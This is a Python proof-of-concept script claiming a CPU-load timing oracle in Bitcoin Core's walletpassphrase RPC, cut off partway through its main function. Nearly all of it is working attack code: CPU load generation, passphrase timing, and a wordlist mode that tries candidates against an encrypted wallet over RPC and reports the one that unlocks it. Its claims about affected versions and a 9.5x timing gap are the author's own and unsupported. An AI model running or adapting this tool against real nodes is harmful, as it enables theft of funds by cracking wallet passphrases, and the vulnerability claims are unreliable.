#!/usr/bin/env python3
"""
poc_cpuload_amplification.py — KL-PAD-NOVEL-CPULOAD-ANOMALY
CPU Load Amplification Timing Oracle PoC

Finding:  Certain Bitcoin Core versions exhibit a CPU-load-dependent
          amplification of the timing gap between valid and invalid
          walletpassphrase attempts.  Under high CPU contention the
          response time for a correct passphrase slows substantially
          compared to an incorrect one — the gap ratio reaches up to
          9.5× on 0.19.0.1.

          CCrypter::Decrypt's PKCS#7 padding check path experiences
          more cache-miss penalties when the CPU is busy, and the
          valid-passphrase code path (full AES-CBC decryption + padding
          validation) suffers disproportionately relative to the
          short-circuit invalid path.

          The effect is version-specific due to compiler optimisations:
            AFFECTED:     0.16.3, 0.19.0.1, 0.21.2
            NOT AFFECTED: 0.17.x, 0.18.x, 0.20.x

          An attacker who can control or observe CPU load can exploit
          this to distinguish correct passphrase candidates without
          knowing the passphrase, enabling online brute-force at a rate
          limited only by RPC access.

Modules:
  1. RPC timing measurement (walletpassphrase round-trip, nanoseconds)
  2. CPU load generation (configurable busy-wait threads per load level)
  3. Gap amplification measurement (valid_mean / invalid_mean per load)
  4. Candidate scoring via timing oracle under load
  5. Wordlist-based candidate scoring under 100% CPU load
  6. JSON report generation

Requires: Python 3, requests (or stdlib http.client), running bitcoind
          with an encrypted wallet (regtest or testnet).

AUTHORISED SECURITY RESEARCH ONLY
"""

import argparse
import base64
import http.client
import json
import math
import multiprocessing
import os
import statistics
import sys
import threading
import time
from typing import Any, Dict, List, Optional, Tuple

# ═══════════════════════════════════════════════════════════════════
# Constants
# ═══════════════════════════════════════════════════════════════════
FINDING_ID = "KL-PAD-NOVEL-CPULOAD-ANOMALY"
ENTROPY_FINDING = "KL-ENTROPY-GRADIENT-ATTRIBUTED"
AFFECTED_VERSIONS = ["0.16.3", "0.19.0.1", "0.21.2"]
NOT_AFFECTED_VERSIONS = ["0.17.x", "0.18.x", "0.20.x"]

GAP_RATIO_WARNING  = 5.0   # flag warning  if gap ratio ≥ 5.0×
GAP_RATIO_CRITICAL = 8.0   # flag critical if gap ratio ≥ 8.0× (audit: 9.5×)

INTER_SAMPLE_DELAY_S = 0.020  # 20 ms between timing samples

# ═══════════════════════════════════════════════════════════════════
# Section 1 — RPC timing measurement
# ═══════════════════════════════════════════════════════════════════

def call_raw_timing(host: str, port: int, rpc_user: str, rpc_pass: str,
                    passphrase: str, timeout_sec: int = 1,
                    wallet: Optional[str] = None) -> int:
    """Call walletpassphrase RPC and return round-trip time in nanoseconds.

    Measures the full HTTP round-trip using time.perf_counter_ns().
    If the passphrase is correct the wallet is immediately re-locked
    via walletlock to avoid leaving it unlocked.
    """
    body = json.dumps({
        'method': 'walletpassphrase',
        'params': [passphrase, timeout_sec],
        'id': 1,
        'jsonrpc': '1.0',
    }).encode()
    auth = base64.b64encode(f'{rpc_user}:{rpc_pass}'.encode()).decode()
    headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Basic {auth}',
    }

    url_path = f'/wallet/{wallet}' if wallet else '/'

    t0 = time.perf_counter_ns()
    try:
        conn = http.client.HTTPConnection(host, port, timeout=30)
        conn.request('POST', url_path, body, headers)
        resp = conn.getresponse()
        raw = resp.read()
        elapsed_ns = time.perf_counter_ns() - t0
        conn.close()

        # If success (wallet unlocked), immediately re-lock
        try:
            resp_data = json.loads(raw)
            if resp_data.get('error') is None:
                _relock(host, port, rpc_user, rpc_pass, wallet)
        except Exception:
            pass

        return elapsed_ns
    except Exception:
        return time.perf_counter_ns() - t0


def _relock(host: str, port: int, rpc_user: str, rpc_pass: str,
            wallet: Optional[str] = None) -> None:
    """Re-lock the wallet after a successful unlock."""
    body = json.dumps({
        'method': 'walletlock',
        'params': [],
        'id': 2,
        'jsonrpc': '1.0',
    }).encode()
    auth = base64.b64encode(f'{rpc_user}:{rpc_pass}'.encode()).decode()
    url_path = f'/wallet/{wallet}' if wallet else '/'
    try:
        conn = http.client.HTTPConnection(host, port, timeout=10)
        conn.request('POST', url_path, body, {
            'Content-Type': 'application/json',
            'Authorization': f'Basic {auth}',
        })
        conn.getresponse().read()
        conn.close()
    except Exception:
        pass


def collect_timing_samples(host: str, port: int, rpc_user: str, rpc_pass: str,
                           passphrase: str, num_samples: int,
                           wallet: Optional[str] = None,
                           verbose: bool = False) -> List[int]:
    """Collect multiple timing samples (nanoseconds) for a given passphrase.

    Inserts a 20 ms inter-sample delay to reduce autocorrelation.
    """
    samples: List[int] = []
    for i in range(num_samples):
        ns = call_raw_timing(host, port, rpc_user, rpc_pass, passphrase,
                             timeout_sec=1, wallet=wallet)
        samples.append(ns)
        if verbose and (i + 1) % 10 == 0:
            print(f'      sample {i + 1}/{num_samples}: {ns / 1e6:.3f} ms')
        time.sleep(INTER_SAMPLE_DELAY_S)
    return samples


# ═══════════════════════════════════════════════════════════════════
# Section 2 — CPU load generation
# ═══════════════════════════════════════════════════════════════════

class CPULoadGenerator:
    """Spawn CPU-bound busy-wait threads to saturate a fraction of logical cores.

    load_fraction = 0.0 → idle (no threads)
    load_fraction = 1.0 → all cores busy
    Partial fractions spawn ceil(load_fraction * cpu_count) threads.
    """

    def __init__(self, load_fraction: float = 1.0, verbose: bool = False):
        self.load_fraction = max(0.0, min(1.0, load_fraction))
        self.verbose = verbose
        self._cpu_count = os.cpu_count() or multiprocessing.cpu_count()
        self._num_threads = math.ceil(self.load_fraction * self._cpu_count)
        self._stop_event = threading.Event()
        self._threads: List[threading.Thread] = []

    @property
    def cpu_count(self) -> int:
        return self._cpu_count

    @property
    def num_threads(self) -> int:
        return self._num_threads

    def _busy_loop(self) -> None:
        """Tight mathematical busy-wait loop to generate CPU load."""
        x = 1.0
        while not self._stop_event.is_set():
            for _ in range(50000):
                x = math.sqrt(x + 1.0)
                x = math.sin(x) * math.cos(x) + 1.0
                if self._stop_event.is_set():
                    return

    def start(self) -> None:
        """Start CPU load threads."""
        if self._num_threads == 0:
            if self.verbose:
                print(f'    [*] Load 0%: no busy threads spawned')
            return
        self._stop_event.clear()
        self._threads = []
        for i in range(self._num_threads):
            t = threading.Thread(target=self._busy_loop, daemon=True,
                                 name=f'cpuload-{i}')
            t.start()
            self._threads.append(t)
        if self.verbose:
            print(f'    [*] Load {self.load_fraction:.0%}: '
                  f'{self._num_threads}/{self._cpu_count} busy threads started')

    def stop(self) -> None:
        """Stop all CPU load threads."""
        self._stop_event.set()
        for t in self._threads:
            t.join(timeout=3.0)
        if self.verbose and self._threads:
            print(f'    [*] {len(self._threads)} load threads stopped')
        self._threads = []

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *args):
        self.stop()


# ═══════════════════════════════════════════════════════════════════
# Section 3 — Welch's t-test (standalone, no scipy)
# ═══════════════════════════════════════════════════════════════════

def welch_t_test(a: List[float], b: List[float]) -> Tuple[float, float]:
    """Welch's t-test for two independent samples.  Returns (t, p_approx)."""
    na, nb = len(a), len(b)
    if na < 2 or nb < 2:
        return 0.0, 1.0
    ma, mb = statistics.mean(a), statistics.mean(b)
    va, vb = statistics.variance(a), statistics.variance(b)
    se = va / na + vb / nb
    if se == 0:
        return 0.0, 1.0
    t = (ma - mb) / math.sqrt(se)
    num = se ** 2
    den = (va / na) ** 2 / (na - 1) + (vb / nb) ** 2 / (nb - 1)
    df = num / den if den > 0 else na + nb - 2
    p = _t_p_value(abs(t), df)
    return t, p


def _t_p_value(t_abs: float, df: float) -> float:
    if df <= 0:
        return 1.0
    x = df / (df + t_abs * t_abs)
    return _reg_inc_beta(x, df / 2.0, 0.5)


def _reg_inc_beta(x: float, a: float, b: float) -> float:
    if x <= 0:
        return 0.0
    if x >= 1:
        return 1.0
    if x > (a + 1.0) / (a + b + 2.0):
        return 1.0 - _reg_inc_beta(1.0 - x, b, a)
    lbeta = (math.lgamma(a + b) - math.lgamma(a) - math.lgamma(b)
             + a * math.log(x) + b * math.log(1.0 - x))
    TINY = 1e-30
    f = c = TINY
    d = 0.0
    for m in range(200):
        if m == 0:
            am = 1.0
        else:
            k = m
            if k % 2 == 0:
                j = k // 2
                am = (j * (b - j) * x) / ((a + 2 * j - 1) * (a + 2 * j))
            else:
                j = (k - 1) // 2
                am = -((a + j) * (a + b + j) * x) / ((a + 2 * j) * (a + 2 * j + 1))
        d = 1.0 + am * d
        if abs(d) < TINY:
            d = TINY
        d = 1.0 / d
        c = 1.0 + am / c
        if abs(c) < TINY:
            c = TINY
        f *= c * d
        if abs(c * d - 1.0) < 1e-10:
            break
    try:
        return math.exp(lbeta) * (f - 1.0) / a
    except (OverflowError, ValueError):
        return 0.0 if t_abs > 5 else 1.0


# ═══════════════════════════════════════════════════════════════════
# Section 4 — RPC helpers (getnetworkinfo, getwalletinfo)
# ═══════════════════════════════════════════════════════════════════

def _rpc_call(host: str, port: int, user: str, pw: str,
              method: str, params: list = None,
              wallet: Optional[str] = None) -> dict:
    """Minimal JSON-RPC call.  Returns parsed response dict."""
    body = json.dumps({
        'method': method,
        'params': params or [],
        'id': 1,
        'jsonrpc': '1.0',
    }).encode()
    auth = base64.b64encode(f'{user}:{pw}'.encode()).decode()
    url_path = f'/wallet/{wallet}' if wallet else '/'
    try:
        conn = http.client.HTTPConnection(host, port, timeout=10)
        conn.request('POST', url_path, body, {
            'Content-Type': 'application/json',
            'Authorization': f'Basic {auth}',
        })
        resp = conn.getresponse()
        data = json.loads(resp.read())
        conn.close()
        return data
    except Exception as e:
        return {'result': None, 'error': {'message': str(e)}}


def get_node_version(host, port, user, pw, wallet=None) -> Optional[str]:
    """Return the node's version string via getnetworkinfo."""
    r = _rpc_call(host, port, user, pw, 'getnetworkinfo', wallet=wallet)
    res = r.get('result')
    if res:
        ver = res.get('subversion', '')
        version_int = res.get('version', 0)
        return f'{ver} (v{version_int})'
    return None


def get_wallet_info(host, port, user, pw, wallet=None) -> dict:
    """Return wallet info dict (encrypted status, name, etc.)."""
    r = _rpc_call(host, port, user, pw, 'getwalletinfo', wallet=wallet)
    return r.get('result', {})


# ═══════════════════════════════════════════════════════════════════
# Section 5 — Gap amplification measurement
# ═══════════════════════════════════════════════════════════════════

def measure_gap_at_load(host: str, port: int, rpc_user: str, rpc_pass: str,
                        valid_passphrase: Optional[str],
                        invalid_passphrase: str,
                        load_fraction: float,
                        num_samples: int,
                        load_duration: float,
                        wallet: Optional[str] = None,
                        verbose: bool = False) -> Dict[str, Any]:
    """Measure valid/invalid timing gap at a specific CPU load level.

    1. Spawn CPU load threads for the given load_fraction.
    2. Wait load_duration seconds for the load to stabilise.
    3. Collect num_samples timing measurements for invalid passphrase.
    4. If valid_passphrase is provided, collect num_samples for it too.
    5. Compute gap ratio = valid_mean / invalid_mean.
    6. Stop load threads.
    """
    loader = CPULoadGenerator(load_fraction, verbose=verbose)
    loader.start()

    # Let load stabilise
    if load_fraction > 0:
        time.sleep(load_duration)

    # Collect invalid baseline
    if verbose:
        print(f'    [*] Collecting {num_samples} invalid-passphrase samples...')
    invalid_ns = collect_timing_samples(
        host, port, rpc_user, rpc_pass, invalid_passphrase,
        num_samples, wallet=wallet, verbose=verbose)

    # Collect valid samples (if known)
    valid_ns: List[int] = []
    if valid_passphrase is not None:
        if verbose:
            print(f'    [*] Collecting {num_samples} valid-passphrase samples...')
        valid_ns = collect_timing_samples(
            host, port, rpc_user, rpc_pass, valid_passphrase,
            num_samples, wallet=wallet, verbose=verbose)

    loader.stop()

    # Compute statistics
    invalid_mean = statistics.mean(invalid_ns) if invalid_ns else 0
    invalid_std = statistics.stdev(invalid_ns) if len(invalid_ns) >= 2 else 0

    result: Dict[str, Any] = {
        'load_fraction': load_fraction,
        'load_threads': loader.num_threads,
        'cpu_count': loader.cpu_count,
        'num_samples': num_samples,
        'invalid_mean_ns': invalid_mean,
        'invalid_std_ns': invalid_std,
        'invalid_samples': invalid_ns,
    }

    if valid_ns:
        valid_mean = statistics.mean(valid_ns)
        valid_std = statistics.stdev(valid_ns) if len(valid_ns) >= 2 else 0
        gap_ratio = valid_mean / invalid_mean if invalid_mean > 0 else 0
        t_stat, p_value = welch_t_test(
            [v / 1e6 for v in valid_ns],
            [v / 1e6 for v in invalid_ns])

        result.update({
            'valid_mean_ns': valid_mean,
            'valid_std_ns': valid_std,
            'valid_samples': valid_ns,
            'gap_ratio': gap_ratio,
            't_statistic': t_stat,
            'p_value': p_value,
        })
    else:
        result.update({
            'valid_mean_ns': None,
            'valid_std_ns': None,
            'valid_samples': [],
            'gap_ratio': None,
            't_statistic': None,
            'p_value': None,
        })

    return result


# ═══════════════════════════════════════════════════════════════════
# Section 6 — ASCII graph
# ═══════════════════════════════════════════════════════════════════

def ascii_bar_graph(load_levels: List[float], gap_ratios: List[float],
                    width: int = 40) -> str:
    """Render a simple ASCII bar graph of gap ratio vs load level."""
    if not gap_ratios:
        return '  (no data)\n'
    max_ratio = max(gap_ratios) if gap_ratios else 1.0
    if max_ratio <= 0:
        max_ratio = 1.0

    lines = []
    lines.append(f'  Gap Ratio vs CPU Load')
    lines.append(f'  {"─" * (width + 20)}')
    for load, ratio in zip(load_levels, gap_ratios):
        bar_len = int((ratio / max_ratio) * width) if max_ratio > 0 else 0
        bar = '█' * bar_len
        marker = ''
        if ratio >= GAP_RATIO_CRITICAL:
            marker = ' [!!] CRITICAL'
        elif ratio >= GAP_RATIO_WARNING:
            marker = ' [!] WARNING'
        lines.append(f'  {load:>5.0%} │ {bar:<{width}} {ratio:.2f}×{marker}')
    lines.append(f'  {"─" * (width + 20)}')
    lines.append(f'  Scale: max = {max_ratio:.2f}×')
    return '\n'.join(lines)


# ═══════════════════════════════════════════════════════════════════
# Section 7 — Candidate scoring
# ═══════════════════════════════════════════════════════════════════

def score_candidates(host: str, port: int, rpc_user: str, rpc_pass: str,
                     candidates: List[str],
                     valid_mean_ns: float,
                     invalid_mean_ns: float,
                     gap_ratio: float,
                     num_samples: int,
                     wallet: Optional[str] = None,
                     verbose: bool = False) -> List[Dict[str, Any]]:
    """Score candidate passphrases under high CPU load.

    For each candidate, collect timing samples at 100% load and compare
    the mean to the known valid and invalid distributions.

    Score = 1 / (1 + |candidate_mean - valid_mean| / gap_width)
    where gap_width = |valid_mean - invalid_mean|.

    Higher score → closer to valid distribution → more likely correct.
    """
    gap_width = abs(valid_mean_ns - invalid_mean_ns)
    if gap_width == 0:
        gap_width = 1  # avoid division by zero

    scored: List[Dict[str, Any]] = []

    # Use 100% load for candidate scoring
    loader = CPULoadGenerator(1.0, verbose=verbose)
    loader.start()
    time.sleep(2.0)  # stabilise

    for idx, cand in enumerate(candidates):
        if verbose:
            print(f'    [*] Scoring candidate {idx + 1}/{len(candidates)}: '
                  f'"{cand[:20]}{"..." if len(cand) > 20 else ""}"')

        cand_ns = collect_timing_samples(
            host, port, rpc_user, rpc_pass, cand,
            num_samples, wallet=wallet, verbose=False)

        cand_mean = statistics.mean(cand_ns) if cand_ns else 0
        dist_to_valid = abs(cand_mean - valid_mean_ns)
        dist_to_invalid = abs(cand_mean - invalid_mean_ns)

        # Weighted score: proximity to valid distribution
        score = 1.0 / (1.0 + dist_to_valid / gap_width)

        # Also run t-test against invalid baseline
        t_stat, p_value = welch_t_test(
            [v / 1e6 for v in cand_ns],
            [invalid_mean_ns / 1e6] * num_samples)  # approximate

        scored.append({
            'candidate': cand,
            'mean_ns': cand_mean,
            'mean_ms': cand_mean / 1e6,
            'dist_to_valid_ns': dist_to_valid,
            'dist_to_invalid_ns': dist_to_invalid,
            'score': score,
            't_statistic': t_stat,
            'p_value': p_value,
            'samples': cand_ns,
        })

    loader.stop()

    # Sort by score descending (most likely correct first)
    scored.sort(key=lambda x: x['score'], reverse=True)
    return scored


# ═══════════════════════════════════════════════════════════════════
# Section 7b — Wordlist-based candidate scoring (no known-correct needed)
# ═══════════════════════════════════════════════════════════════════

def score_candidates_from_file(host: str, port: int, rpc_user: str,
                               rpc_pass: str, candidates: List[str],
                               num_samples: int,
                               wallet: Optional[str] = None,
                               verbose: bool = False) -> Tuple[List[Dict[str, Any]], Optional[str]]:
    """Score candidate passphrases under 100% CPU load using response time ranking.

    Under full CPU contention the correct passphrase triggers the full
    CCrypter::Decrypt path (AES-CBC + PKCS#7 padding validation) which is
    disproportionately slowed compared to the short-circuit invalid path.
    The candidate with the longest mean response time is the most likely
    to be correct.

    Returns (ranked_list, found_passphrase_or_None).
    """
    scored: List[Dict[str, Any]] = []
    found_correct: Optional[str] = None

    loader = CPULoadGenerator(1.0, verbose=verbose)
    loader.start()
    time.sleep(2.0)  # let load stabilise

    total = len(candidates)
    for idx, cand in enumerate(candidates):
        # Progress every 500 candidates
        if (idx + 1) % 500 == 0 or idx == 0:
            print(f'  [*] Progress: {idx + 1}/{total} candidates scored...')

        cand_ns = collect_timing_samples(
            host, port, rpc_user, rpc_pass, cand,
            num_samples, wallet=wallet, verbose=False)

        cand_mean = statistics.mean(cand_ns) if cand_ns else 0

        scored.append({
            'candidate': cand,
            'mean_ns': cand_mean,
            'mean_ms': cand_mean / 1e6,
        })

        # Check if the wallet actually unlocked (correct passphrase found)
        # We detect this by making a walletpassphrase call and checking the
        # response — call_raw_timing already re-locks on success, but we
        # need to check if any sample succeeded.
        # A simple heuristic: try once more and inspect the RPC response.
        unlock_check = _rpc_call(host, port, rpc_user, rpc_pass,
                                 'walletpassphrase', [cand, 1], wallet=wallet)
        if unlock_check.get('error') is None:
            # Wallet unlocked — this is the correct passphrase!
            _relock(host, port, rpc_user, rpc_pass, wallet)
            found_correct = cand
            print(f'\n  [!!!] CORRECT PASSPHRASE FOUND: "{cand}"')
            print(f'        Wallet unlocked successfully. Stopping scoring.')
            break

    loader.stop()

    # Sort by descending mean response time (longest = most likely correct)
    scored.sort(key=lambda x: x['mean_ns'], reverse=True)
    return scored, found_correct


# ═══════════════════════════════════════════════════════════════════
# Section 8 — JSON report generation
# ═══════════════════════════════════════════════════════════════════

def generate_report(node_version: Optional[str],
                    wallet_info: dict,
                    cpu_count: int,
                    load_results: List[Dict[str, Any]],
                    candidate_scores: Optional[List[Dict[str, Any]]],
                    output_path: str,
                    candidate_ranking: Optional[List[Dict[str, Any]]] = None) -> None:
    """Write comprehensive JSON report."""
    # Determine amplification
    gap_ratios = [r['gap_ratio'] for r in load_results
                  if r.get('gap_ratio') is not None]
    max_ratio = max(gap_ratios) if gap_ratios else 0
    amplification_detected = max_ratio >= GAP_RATIO_WARNING

    # Serialise load results (strip raw sample arrays for brevity)
    load_summary = []
    for r in load_results:
        entry = {
            'load_fraction': r['load_fraction'],
            'load_threads': r['load_threads'],
            'valid_mean_ns': r.get('valid_mean_ns'),
            'invalid_mean_ns': r.get('invalid_mean_ns'),
            'gap_ratio': r.get('gap_ratio'),
            't_statistic': r.get('t_statistic'),
            'p_value': r.get('p_value'),
        }
        load_summary.append(entry)

    # Serialise candidate scores (strip raw samples)
    cand_summary = None
    if candidate_scores:
        cand_summary = []
        for cs in candidate_scores:
            cand_summary.append({
                'candidate': cs['candidate'],
                'mean_ns': cs['mean_ns'],
                'mean_ms': cs['mean_ms'],
                'score': cs['score'],
                't_statistic': cs['t_statistic'],
                'p_value': cs['p_value'],
            })

    # Serialise candidate ranking from file-based scoring
    ranking_summary = None
    if candidate_ranking:
        ranking_summary = []
        for cr in candidate_ranking:
            ranking_summary.append({
                'candidate': cr['candidate'],
                'mean_ns': cr['mean_ns'],
                'mean_ms': cr['mean_ms'],
            })

    report = {
        'finding': FINDING_ID,
        'related_finding': ENTROPY_FINDING,
        'affected_versions': AFFECTED_VERSIONS,
        'not_affected_versions': NOT_AFFECTED_VERSIONS,
        'node_version': node_version,
        'wallet_name': wallet_info.get('walletname', ''),
        'encrypted_status': 'unlocked_until' in wallet_info,
        'cpu_count': cpu_count,
        'load_levels_tested': [r['load_fraction'] for r in load_results],
        'load_results': load_summary,
        'amplification_detected': amplification_detected,
        'amplification_ratio_max': round(max_ratio, 4) if max_ratio else None,
        'gap_ratio_warning_threshold': GAP_RATIO_WARNING,
        'gap_ratio_critical_threshold': GAP_RATIO_CRITICAL,
        'candidate_scores': cand_summary,
        'candidate_ranking': ranking_summary,
    }

    with open(output_path, 'w') as f:
        json.dump(report, f, indent=2, default=str)

    print(f'  [*] JSON report written to: {output_path}')


# ═══════════════════════════════════════════════════════════════════
# Section 9 — Main entry point
# ═══════════════════════════════════════════════════════════════════

def main():
    print(f'''
╔══════════════════════════════════════════════════════════════╗
║  {FINDING_ID}                    ║
║  CPU Load Amplification Timing Oracle PoC                    ║
║                                                              ║
║  Affected versions: {", ".join(AFFECTED_VERSIONS):<39s} ║
║  Not affected:      {", ".join(NOT_AFFECTED_VERSIONS):<39s} ║
║  Attack vector:     CPU-load-dependent timing gap            ║
║  Requirement:       RPC access to encrypted wallet           ║
║                                                              ║
║  Related: {ENTROPY_FINDING}                ║
║  AUTHORISED SECURITY RESEARCH ONLY                           ║
╚══════════════════════════════════════════════════════════════╝
''')

    parser = argparse.ArgumentParser(
        description=(
            f'{FINDING_ID}: CPU Load Amplification Timing Oracle PoC. '
            f'Measures the timing gap between valid and invalid '
            f'walletpassphrase attempts under varying CPU load to detect '
            f'the amplification anomaly in affected Bitcoin Core versions.'
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            'Examples:\n'
            '  %(prog)s --rpc-user bitcoin --rpc-pass bitcoin '
            '--known-correct "secret123"\n'
            '  %(prog)s --rpc-port 18443 --rpc-user rpc --rpc-pass rpc '
            '--known-correct "mypass" --load-levels 0 25 50 75 100\n'
            '  %(prog)s --rpc-user bitcoin --rpc-pass bitcoin '
            '--known-correct "secret" --candidates "pass1" "pass2" "secret" '
            '--output-json report.json\n'
        ),
    )

    # RPC connection
    parser.add_argument('--rpc-host', type=str, default='127.0.0.1',
                        help='bitcoind RPC host (default: 127.0.0.1)')
    parser.add_argument('--rpc-port', type=int, default=18443,
                        help='bitcoind RPC port (default: 18443)')
    parser.add_argument('--rpc-user', type=str, default='bitcoin',
                        help='bitcoind RPC user (default: bitcoin)')
    parser.add_argument('--rpc-pass', type=str, default='bitcoin',
                        help='bitcoind RPC password (default: bitcoin)')
    parser.add_argument('--rpc-wallet', type=str, default=None,
                        help='Wallet name for multi-wallet RPC (optional)')

    # Passphrase parameters
    parser.add_argument('--known-correct', type=str, default=None,
                        help='Known correct passphrase for valid-timing baseline '
                             '(if not given, only invalid baseline is measured)')
    parser.add_argument('--invalid-probe', type=str,
                        default='__INVALID_PROBE_XYZ',
                        help='Invalid passphrase for baseline '
                             '(default: __INVALID_PROBE_XYZ)')
    parser.add_argument('--candidates', nargs='+', type=str, default=None,
                        help='Candidate passphrases to score via timing oracle')
    parser.add_argument('--candidates-file', type=str, default=None,
                        help='Path to a wordlist file (one candidate per line). '
                             'Enables file-based candidate scoring under 100%% '
                             'CPU load, bypassing gap measurement phases.')
    parser.add_argument('--ranking-output', type=str, default='candidate_ranking.txt',
                        help='Output file for the full ranked candidate list '
                             '(default: candidate_ranking.txt)')

    # Measurement parameters
    parser.add_argument('--samples', type=int, default=30,
                        help='Number of timing samples per load level (default: 30)')
    parser.add_argument('--load-levels', nargs='+', type=int,
                        default=[0, 50, 100],
                        help='CPU load percentages to test '
                             '(default: 0 50 100)')
    parser.add_argument('--load-duration', type=float, default=5.0,
                        help='Seconds to maintain each load level before '
                             'sampling (default: 5)')

    # Output
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output')
    parser.add_argument('--output-json', type=str, default=None,
                        help='Write JSON report to this file')

    args = parser.parse_args()

    # ── Validate load levels ──
    load_fractions = [max(0, min(100, l)) / 100.0 for l in args.load_levels]
    load_fractions = sorted(set(load_fractions))

    # ── Determine CPU count ──
    cpu_count = os.cpu_count() or multiprocessing.cpu_count()

    # ── Check node connectivity ──
    print(f'\n  {"═" * 58}')
    print(f'  NODE CONNECTIVITY')
    print(f'  {"═" * 58}')

    node_version = get_node_version(
        args.rpc_host, args.rpc_port, args.rpc_user, args.rpc_pass,
        wallet=args.rpc_wallet)
    if node_version:
        print(f'  [*] Node version: {node_version}')
    else:
        print(f'  [!] Could not retrieve node version (RPC may be unavailable)')
        print(f'  [!] Ensure bitcoind is running with RPC enabled.')

    wallet_info = get_wallet_info(
        args.rpc_host, args.rpc_port, args.rpc_user, args.rpc_pass,
        wallet=args.rpc_wallet)
    if wallet_info:
        encrypted = 'unlocked_until' in wallet_info
        wname = wallet_info.get('walletname', '(default)')
        print(f'  [*] Wallet: {wname}')
        print(f'  [*] Encrypted: {"YES" if encrypted else "NO"}')
        if not encrypted:
            print(f'  [!!] WARNING: Wallet is NOT encrypted.')
            print(f'       The timing oracle requires an encrypted wallet.')
    else:
        print(f'  [!] Could not retrieve wallet info')
        wallet_info = {}

    # ══════════════════════════════════════════════════════════════
    # BRANCH: --candidates-file mode (wordlist scoring under 100% load)
    # ══════════════════════════════════════════════════════════════
    if args.candidates_file:
        # Read wordlist
        try:
            with open(args.candidates_file, 'r', encoding='utf-8',
                       errors='replace') as f:
                file_candidates = [line.strip() for line in f
                                   if line.strip()]
        except FileNotFoundError:
            print(f'  [!!] ERROR: Candidates file not found: '
                  f'{args.candidates_file}')
            sys.exit(1)
        except Exception as e:
            print(f'  [!!] ERROR reading candidates file: {e}')
            sys.exit(1)

        print(f'\n  {"═" * 58}')
        print(f'  WORDLIST CANDIDATE SCORING MODE')
        print(f'  {"═" * 58}')
        print(f'  [*] CPU cores detected: {cpu_count}')
        print(f'  [*] Candidates file: {args.candidates_file}')
        print(f'  [*] Candidates loaded: {len(file_candidates)}')
        print(f'  [*] Samples per candidate: {args.samples}')
        print(f'  [*] CPU load: 100% (all {cpu_count} cores)')
        print(f'  [*] Ranking output: {args.ranking_output}')
        if args.known_correct:
            print(f'  [*] Known-correct provided (will highlight if found)')
        print(f'\n  [*] Starting candidate scoring under full CPU load...\n')

        file_ranking, found = score_candidates_from_file(
            args.rpc_host, args.rpc_port, args.rpc_user, args.rpc_pass,
            file_candidates, args.samples,
            wallet=args.rpc_wallet, verbose=args.verbose)

        # ── Print TOP CANDIDATES table ──
        top_n = min(20, len(file_ranking))
        print(f'\n  {"═" * 58}')
        print(f'  TOP CANDIDATES (by mean response time, descending)')
        print(f'  {"═" * 58}')
        print(f'  {"Rank":<6}{"Candidate":<30}{"Mean (ms)":<14}{"Marker"}')
        print(f'  {"─" * 62}')
        for rank, cr in enumerate(file_ranking[:top_n], 1):
            cand_display = cr['candidate'][:27]
            if len(cr['candidate']) > 27:
                cand_display += '...'
            marker = ''
            if found and cr['candidate'] == found:
                marker = ' ★ CORRECT'
            elif args.known_correct and cr['candidate'] == args.known_correct:
                marker = ' ★ KNOWN-CORRECT'
            print(f'  {rank:<6}{cand_display:<30}{cr["mean_ms"]:<14.3f}{marker}')
        print(f'  {"─" * 62}')
        if found:
            print(f'  ★ = confirmed correct passphrase (wallet unlocked)')
        else:
            print(f'  Longest response time = most likely correct '
                  f'(full CCrypter::Decrypt path)')

        # ── Save full ranked list ──
        ranking_path = args.ranking_output
        try:
            with open(ranking_path, 'w') as rf:
                rf.write(f'# Candidate Ranking — {FINDING_ID}\n')
                rf.write(f'# Scored under 100% CPU load, '
                         f'{args.samples} samples per candidate\n')
                rf.write(f'# Sorted by descending mean response time\n')
                rf.write(f'# Total candidates: {len(file_ranking)}\n')
                if found:
                    rf.write(f'# CORRECT PASSPHRASE FOUND: {found}\n')
                rf.write(f'#\n')
                rf.write(f'{"# Rank":<8}{"Candidate":<40}{"Mean_ns":<18}'
                         f'{"Mean_ms":<14}\n')
                for rank, cr in enumerate(file_ranking, 1):
                    rf.write(f'  {rank:<8}{cr["candidate"]:<40}'
                             f'{cr["mean_ns"]:<18.0f}{cr["mean_ms"]:<14.3f}\n')
            print(f'\n  [*] Full ranked list saved to: {ranking_path}')
        except Exception as e:
            print(f'  [!] Failed to write ranking file: {e}')

        # ── JSON report (if requested) ──
        if args.output_json:
            print(f'\n  {"═" * 58}')
            print(f'  JSON REPORT')
            print(f'  {"═" * 58}')
            generate_report(
                node_version, wallet_info, cpu_count,
                [],  # no load_results in file-scoring mode
                None,  # no legacy candidate_scores
                args.output_json,
                candidate_ranking=file_ranking)

        # ── Final summary ──
        print(f'\n  {"═" * 58}')
        print(f'  ANALYSIS COMPLETE')
        print(f'  {"═" * 58}')
        print(f'  Finding:              {FINDING_ID}')
        print(f'  Mode:                 Wordlist candidate scoring')
        print(f'  Candidates scored:    {len(file_ranking)}')
        print(f'  Top candidate:        "{file_ranking[0]["candidate"]}" '
              f'({file_ranking[0]["mean_ms"]:.3f} ms)')
        if found:
            print(f'  CORRECT PASSPHRASE:   "{found}"')
        print(f'  Ranking saved to:     {ranking_path}')
        print(f'  {"═" * 58}')
        return

    # ══════════════════════════════════════════════════════════════
    # ORIGINAL MODE: Gap amplification measurement
    # ══════════════════════════════════════════════════════════════
    print(f'\n  [*] CPU cores detected: {cpu_count}')
    print(f'  [*] Load levels to test: {[f"{l:.0%}" for l in load_fractions]}')
    print(f'  [*] Samples per level: {args.samples}')
    print(f'  [*] Load stabilisation: {args.load_duration}s')
    print(f'  [*] Invalid probe: "{args.invalid_probe}"')
    if args.known_correct:
        print(f'  [*] Known-correct passphrase provided: YES')
    else:
        print(f'  [!] No known-correct passphrase provided')
        print(f'      Gap amplification cannot be fully quantified.')
        print(f'      Only invalid-timing gradient will be measured.')

    # ── Phase 1: Measure gap at each load level ──
    print(f'\n  {"═" * 58}')
    print(f'  PHASE 1: GAP AMPLIFICATION MEASUREMENT')
    print(f'  {"═" * 58}')

    load_results: List[Dict[str, Any]] = []

    for load_frac in load_fractions:
        print(f'\n  ── Load level: {load_frac:.0%} ──')

        result = measure_gap_at_load(
            args.rpc_host, args.rpc_port, args.rpc_user, args.rpc_pass,
            valid_passphrase=args.known_correct,
            invalid_passphrase=args.invalid_probe,
